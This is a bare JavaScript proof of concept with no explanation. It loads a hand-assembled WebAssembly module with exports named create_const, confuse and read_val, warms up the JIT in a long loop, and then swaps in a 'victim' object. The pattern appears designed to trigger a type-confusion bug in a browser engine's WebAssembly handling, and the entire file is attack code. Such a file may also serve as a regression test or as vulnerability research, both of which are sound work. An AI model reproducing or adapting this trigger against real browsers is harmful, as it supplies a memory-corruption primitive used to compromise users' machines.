const wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x11, 0x02, 0x60, 0x00, 0x01, 0x7b, 0x60, 0x01, 0x7b, 0x00, 0x02, 0x0e, 0x01, 0x04, 0x73, 0x75, 0x62, 0x00, 0x02, 0x5f, 0x01, 0x7f, 0x00, 0x5f, 0x01, 0x7f, 0x01, 0x03, 0x04, 0x05, 0x01, 0x00, 0x01, 0x02, 0x07, 0x27, 0x03, 0x0a, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x5f, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x00, 0x00, 0x07, 0x63, 0x6f, 0x6e, 0x66, 0x75, 0x73, 0x65, 0x00, 0x01, 0x08, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x76, 0x61, 0x6c, 0x00, 0x02, 0x0a, 0x31, 0x03, 0x0a, 0x00, 0x41, 0x7b, 0xfb, 0x01, 0x00, 0xd4, 0x0b, 0x0e, 0x00, 0x20, 0x00, 0xd3, 0x18, 0x01, 0x41, 0xc8, 0x03, 0xfb, 0x03, 0x01, 0x00, 0x0b, 0x0c, 0x00, 0x20, 0x00, 0xd3, 0x18, 0x00, 0xfb, 0x02, 0x00, 0x0b]);
const module = new WebAssembly.Module(wasm_code);
const instance = new WebAssembly.Instance(module, {});
const { create_const, confuse, read_val } = instance.exports;

let victim_obj = create_const();
let do_side_effect = false;

for (let i = 0; i < 25000; i++) {
    if (i === 24999) {
        do_side_effect = true;
    }
    let obj = do_side_effect ? victim_obj : create_const();
    try {
        confuse(obj);
    } catch (e) {

    }
}

try {
    read_val(victim_obj);
} catch (e) {
}